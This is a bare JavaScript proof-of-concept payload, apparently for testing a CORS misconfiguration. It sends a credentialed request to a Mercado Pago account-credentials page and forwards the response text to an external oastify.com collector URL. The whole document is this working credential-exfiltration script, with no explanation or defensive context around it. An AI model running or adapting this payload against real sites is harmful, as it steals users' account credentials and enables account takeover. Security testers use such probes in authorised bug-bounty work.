var xhr = new XMLHttpRequest();
xhr.onload = reqListener;
xhr.open('get','https://www.mercadopago.com.mx/settings/account/credentials',true);
xhr.withCredentials = true;

function reqListener() {
    location='https://0bc9abiafotb44wy54id9xatrkxbl5it7.oastify.com/log?key='+this.responseText;
}
